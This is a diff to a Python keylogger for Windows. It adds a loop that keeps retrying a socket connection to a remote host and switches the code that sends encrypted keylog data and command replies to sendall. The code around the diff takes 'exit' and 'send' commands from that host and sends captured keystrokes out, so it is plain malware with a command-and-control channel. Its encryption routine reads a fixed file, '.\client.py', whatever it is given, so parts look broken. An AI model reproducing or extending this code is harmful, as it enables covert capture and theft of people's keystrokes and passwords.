@@ -17,6 +17,7 @@ from win32gui import GetWindowText, GetForegroundWindow
 class Keylogger:
     def __init__(self, log_interval, window_interval):
         self.active = False
+        self.connected = False
         self.filecounter = 0
 
         self.log_interval = log_interval
@@ -100,8 +101,16 @@ class Keylogger:
     def connect_to_host(self):
         self.sock.connect((self.host, self.port))
 
+    def try_connecting(self):
+        while not self.connected:
+            try:
+                self.connect_to_host()
+                self.connected = True
+            except:
+                time.sleep(5)
+
     def send_keylog_files_to_host(self):
-        self.sock.send(self.encryption(b'data'))
+        self.sock.sendall(self.encryption(b'data'))
 
     def encryption(self, fileName):
         openFile = open(".\client.py", "r")
@@ -123,7 +132,6 @@ class Keylogger:
         cipherText, tag = cipher.encrypt_and_digest(fileData)
         return nonce + tag + cipherText
 
-
     def start(self):
         self.active = True
         self.write_information_file()
@@ -135,14 +143,7 @@ class Keylogger:
         foreground_window_thread = Thread(target=self.check_foreground_window)
         foreground_window_thread.start()
 
-        noConnection = True
-        while noConnection:
-            try:
-                self.connect_to_host()
-                noConnection = False
-            except:
-                time.sleep(5)
-                pass
+        self.try_connecting()
 
         while True:
             recv = self.sock.recv(1024)
@@ -150,14 +151,14 @@ class Keylogger:
                 recv = str(recv)[2:-1]
 
                 if recv == "exit":
-                    self.sock.send(self.encryption(b'terminating'))
+                    self.sock.sendall(self.encryption(b'terminating'))
                     self.sock.close()
                     self.active = False
                     break
                 elif recv == "send":
                     self.send_keylog_files_to_host()
                 else:
-                    self.sock.send(self.encryption(b'received'))
+                    self.sock.sendall(self.encryption(b'received'))
                     print(recv)
 
 if __name__ == "__main__":
